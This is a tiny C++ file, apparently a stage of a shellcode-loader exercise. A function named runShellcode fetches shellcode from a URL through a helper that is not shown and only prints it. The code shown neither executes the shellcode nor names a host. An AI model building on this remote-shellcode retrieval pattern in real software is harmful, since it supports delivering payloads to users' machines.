#include "../../Public.hpp"

void runShellcode()
{
    std::string shellcode = GetShellcodeFromUrl();
    std::cout << shellcode << std::endl;
}

int main()
{
    runShellcode();
    
    return 0;
}